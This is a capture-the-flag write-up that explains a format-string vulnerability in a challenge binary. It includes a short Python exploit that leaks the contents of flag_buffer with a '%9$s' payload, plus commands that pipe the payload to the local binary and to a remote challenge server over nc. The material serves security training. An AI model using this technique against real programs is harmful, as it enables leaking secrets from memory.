# Solution Writeup: Secret Message

## Challenge Analysis

1.  **Binary Inspection**:
    -   `file challenge`: Identified it as a 64-bit ELF executable.
    -   `strings challenge`: Found interesting strings like `flag_buffer`, `read_flag`, and `admin_token`.
    -   `objdump -d -M intel challenge`: Disassembled the binary to understand the control flow.

2.  **Vulnerability Identification**:
    -   The `vulnerable_function` (at address `0x401341`) copies user input to a stack buffer using `strncpy`.
    -   It then calls `printf` directly on this buffer: `call printf@plt` with the user input as the first argument (`rdi`).
    -   This is a classic **Format String Vulnerability**.

3.  **Target Location**:
    -   The `read_flag` function (at `0x401256`) reads the flag from a file and stores it in a global variable named `flag_buffer`.
    -   Disassembly reveals the address of `flag_buffer`:
        ```assembly
        4012ab: lea rax,[rip+0x2dce] # 404080 <flag_buffer>
        ```
    -   Target Address: `0x404080`.

4.  **Offset Determination**:
    -   Sending a payload of `%p %p %p ...` to the binary leaks stack values.
    -   The input buffer `0x7025207025207025` (ASCII for `%p %p %p`) appeared at the **8th** argument position.
    -   To reference an address placed *after* our format string, we need to calculate alignment.

5.  **Payload Construction**:
    -   We want to print the string at `0x404080`. We can use the `%s` format specifier.
    -   We need to place the address `0x404080` on the stack so `printf` can use it as an argument.
    -   We put the format specifier first: `%9$s` (read string from 9th argument).
    -   Why 9th?
        -   Argument 8 is the start of our buffer.
        -   `%9$s` takes 4 bytes.
        -   We add 4 bytes of padding (`AAAA`) to align the next 8 bytes to the next stack slot (Argument 9).
    -   Payload: `%9$s` + `AAAA` + `\x80\x40\x40\x00\x00\x00\x00\x00` (Little Endian address of `flag_buffer`).

## Exploit Script (`exploit.py`)

```python
import sys

# Target: flag_buffer @ 0x404080
# Vulnerability: Format String in vulnerable_function

# Payload breakdown:
# 1. %9$s : Print the string pointed to by the 9th argument on the stack.
# 2. AAAA : Padding to align the payload to 8 bytes.
# 3. Address : The 64-bit address of flag_buffer (0x404080).

# The stack layout (simplified):
# Arg 8: "%9$sAAAA" (8 bytes)
# Arg 9: 0x0000000000404080 (Address of flag)

payload = b'%9$sAAAA' + b'\x80\x40\x40\x00\x00\x00\x00\x00'

# Write to stdout to pipe into the challenge
sys.stdout.buffer.write(payload + b'\n')
```

## Execution

Run the exploit locally (if you have the binary and flag.txt):
```bash
python3 exploit.py | ./challenge
```

Run against the remote server:
```bash
python3 exploit.py | nc pods.shibirsec.qzz.io 36044
```

